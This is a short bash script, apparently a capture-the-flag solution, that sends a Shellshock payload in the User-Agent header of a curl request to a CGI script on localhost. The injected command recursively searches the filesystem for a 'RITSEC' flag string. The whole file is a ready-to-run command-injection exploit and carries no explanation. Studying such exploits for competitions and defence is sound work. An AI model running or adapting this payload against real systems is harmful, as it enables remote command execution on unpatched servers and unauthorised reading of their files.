#!/bin/bash
# Change URL as needed
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'grep -r RITSEC /;'" http://localhost:80/cgi-bin/stats